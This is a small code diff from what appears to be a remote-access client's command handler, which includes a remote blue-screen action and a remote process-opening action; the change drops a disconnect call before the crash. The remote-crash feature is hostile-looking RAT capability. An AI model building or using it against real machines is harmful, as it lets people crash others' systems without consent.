@@ -200,7 +200,6 @@ BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) 
         success = TRUE;
         break;
     case RemoteAction::kRemoteBSOD:
-        this->Disconnect(false);
         this->m_ProcMgr.BSOD();
         break;
     case RemoteAction::kOpenRemoteProcess:
